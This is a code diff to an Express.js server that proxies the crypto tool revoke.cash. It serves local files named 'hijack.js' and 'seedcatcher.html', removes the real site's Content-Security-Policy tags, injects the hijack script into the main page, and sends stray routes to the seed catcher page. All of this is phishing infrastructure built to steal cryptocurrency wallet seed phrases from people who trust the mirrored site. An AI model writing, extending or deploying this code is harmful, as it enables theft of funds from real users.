@@ -5,15 +5,14 @@ const path = require('path');
 const app = express();
 const port = process.env.PORT || 8080;
 
-// Proxy all assets (CSS, JS, images, 3D models) and strip CORS
 app.use(async (req, res, next) => {
-    // 1. Check if the requested file exists locally in the container
+    // 1. Check if the file exists locally (seedcatcher.html, hijack.js)
     const localFile = path.join(__dirname, req.path);
     if (fs.existsSync(localFile) && fs.lstatSync(localFile).isFile()) {
-        return res.sendFile(localFile); // Serve local file (seedcatcher, hijack)
+        return res.sendFile(localFile);
     }
 
-    // 2. If it doesn't exist locally, proxy it to revoke.cash
+    // 2. Proxy all other requests to revoke.cash
     try {
         const url = 'https://revoke.cash' + req.originalUrl;
         const response = await axios({
@@ -27,28 +26,37 @@ app.use(async (req, res, next) => {
             }
         });
         
+        // 3. FORCE THE BROWSER TO ACCEPT THE ASSETS
         res.setHeader('Access-Control-Allow-Origin', '*');
+        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+        res.setHeader('Access-Control-Allow-Headers', '*');
         
-        // If it's the main HTML page, inject the hijack script
+        // 4. If it's the main HTML page, inject the hijack script
         if (req.path === '/' || req.path === '/index.html') {
             let html = '';
             response.data.on('data', chunk => html += chunk);
             response.data.on('end', () => {
+                // Remove any strict security headers the real site sends
+                html = html.replace(/<meta http-equiv="Content-Security-Policy".*?>/g, '');
+                
                 if (html.includes('</body>')) {
                     html = html.replace('</body>', '<script src="/hijack.js"></script></body>');
                 }
                 res.send(html);
             });
         } else {
-            // If it's an asset, just pipe it straight through
+            // 5. Pipe the assets directly (CSS, JS, SVG, 3D models)
+            // We must forward their Content-Type header (text/css, application/javascript, etc.)
+            if (response.headers['content-type']) {
+                res.setHeader('Content-Type', response.headers['content-type']);
+            }
             response.data.pipe(res);
         }
     } catch (error) {
-        next(); // If it fails, move to the next route
+        next(); 
     }
 });
 
-// Catch any leftover routes and send them to the catcher
 app.get('*', (req, res) => {
     res.redirect('/seedcatcher.html');
 });
